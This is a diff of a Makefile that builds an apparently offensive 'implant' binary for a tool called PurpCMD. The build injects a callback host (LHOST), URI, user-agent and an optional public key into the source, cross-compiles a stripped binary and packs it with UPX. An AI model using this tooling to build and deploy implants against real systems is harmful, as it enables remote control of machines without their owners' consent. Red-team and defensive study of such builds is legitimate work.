@@ -1,32 +1,79 @@
-all: help
-BIN="purpc"
-COMP="purpcc"
+## Defaults (overridden by the implantbuilder or command-line)
+OUTPUT    ?= implant
+LHOST     ?= 127.0.0.1:4444
+OS        ?= linux
+ARCH      ?= amd64
+URI       ?= /
+UA        ?= Mozilla PurpCMD
+PUBLICKEY ?=
+
+GOOS      ?= $(OS)
+GOARCH    ?= $(ARCH)
+
+TMP_SRC   := main_build.go
+
+.DEFAULT_GOAL := build
 
 ## Build
-build: ## Build binary
-	@cat main.go | sed -e 's/LHOST/$(LHOST)/g' > main_b.go
-	@go build -o $(BIN) -ldflags "-s -w" main_b.go
-	@rm main_b.go
+.PHONY: build
+build: ## Build implant binary (used by implantbuilder and manually)
+	@echo "[*] Generating $(TMP_SRC) ..."
+	@sed \
+		-e 's|"LHOST"|"$(LHOST)"|g' \
+		-e 's|uri  := "/"|uri  := "$(URI)"|g' \
+		-e 's|"Mozilla PurpCMD"|"$(UA)"|g' \
+		main.go > $(TMP_SRC)
+	@if [ -n "$(PUBLICKEY)" ]; then \
+		echo "[*] Embedding public key from $(PUBLICKEY) ..."; \
+		python3 -c "\
+import sys, base64; \
+pem = open(sys.argv[1]).read(); \
+b64 = ''.join(l for l in pem.splitlines() if not l.startswith('-----')); \
+der = base64.b64decode(b64); \
+arr = ','.join('0x{:02x}'.format(b) for b in der); \
+decl = 'var publicKeyDER = []byte{' + arr + '}'; \
+src = open(sys.argv[2]).read().replace('var publicKeyDER []byte', decl, 1); \
+open(sys.argv[2], 'w').write(src) \
+" $(PUBLICKEY) $(TMP_SRC); \
+	fi
+	@echo "[*] Building $(OUTPUT) ($(GOOS)/$(GOARCH)) ..."
+	@GOOS=$(GOOS) GOARCH=$(GOARCH) CGO_ENABLED=0 \
+		go build -ldflags "-s -w" -o $(OUTPUT) $(TMP_SRC)
+	@rm -f $(TMP_SRC)
+	@echo "[+] Done: $(OUTPUT)"
 
-build32: ## Build 32 bits binary
-	@cat main.go | sed -e 's/LHOST/$(LHOST)/g' > main_b.go
-	@GOARCH=386 go build -o $(BIN) -ldflags "-s -w" main_b.go
-	@rm main_b.go
+.PHONY: build32
+build32: ## Build 32-bit Linux binary
+	@$(MAKE) build ARCH=386 GOARCH=386
 
-bcompress: build
-	@upx -9 -o $(COMP) $(BIN)
+.PHONY: compress
+compress: build ## Build and compress with UPX
+	upx -9 -o $(OUTPUT).upx $(OUTPUT)
 
-bcompress32: build32
-	@upx -9 -o $(COMP) $(BIN)
+.PHONY: compress32
+compress32: build32 ## Build 32-bit and compress with UPX
+	upx -9 -o $(OUTPUT).upx $(OUTPUT)
+
+.PHONY: clean
+clean: ## Remove build artifacts
+	@rm -f $(TMP_SRC) _pubkey_snippet.go.tmp
 
 ## Help
+.PHONY: help
 help: ## Show this help
 	@echo ''
 	@echo 'Usage:'
-	@echo '  ${YELLOW}make${RESET} ${GREEN}<target>${RESET}'
+	@echo '  make <target> [OPTION=value ...]'
+	@echo ''
+	@echo 'Options (with defaults):'
+	@echo '  OUTPUT=$(OUTPUT)'
+	@echo '  LHOST=$(LHOST)'
+	@echo '  OS=$(OS)  ARCH=$(ARCH)'
+	@echo '  URI=$(URI)'
+	@echo '  UA=$(UA)'
+	@echo '  PUBLICKEY=$(PUBLICKEY)'
 	@echo ''
 	@echo 'Targets:'
-	@awk 'BEGIN {FS = ":.*?## "} { \
-		if (/^[a-zA-Z_-]+:.*?##.*$$/) {printf "    ${YELLOW}%-20s${GREEN}%s${RESET}\n", $$1, $$2} \
-		else if (/^## .*$$/) {printf "  ${CYAN}%s${RESET}\n", substr($$1,4)} \
-		}' $(MAKEFILE_LIST)
+	@awk 'BEGIN {FS = ":.*?## "} \
+	/^[a-zA-Z_-]+:.*?##/ { printf "  %-14s %s\n", $$1, $$2 } \
+	/^## / { printf "\n%s\n", substr($$0,4) }' $(MAKEFILE_LIST)
